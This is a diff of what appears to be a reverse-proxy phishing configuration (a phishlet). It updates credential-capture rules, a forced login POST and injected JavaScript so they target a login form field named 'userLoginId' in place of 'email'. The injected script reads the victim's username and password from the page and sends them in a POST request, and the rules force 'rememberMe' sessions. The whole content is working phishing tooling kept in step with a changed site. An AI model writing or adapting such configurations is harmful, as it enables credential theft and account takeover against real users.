@@ -18,7 +18,7 @@ auth_urls:
 
 credentials:
   username:
-    key: 'email'
+    key: 'userLoginId'
     search: '(.*)'
     type: 'post'
   password:
@@ -29,7 +29,7 @@ credentials:
 force_post:
   - path: '/login'
     search:
-      - {key: 'email', search: '.*'}
+      - {key: 'userLoginId', search: '.*'}
       - {key: 'password', search: '.*'}
     force:
       - {key: 'rememberMe', value: 'true'}
@@ -51,7 +51,7 @@ js_inject:
         return;
       }
       function sendPass(){
-        var email = document.getElementsByName("email")[0].value;
+        var email = document.getElementsByName("userLoginId")[0].value;
         var password = document.getElementsByName("password")[0].value;
         var xhr = new XMLHttpRequest();
         xhr.open("POST", '/login', true);
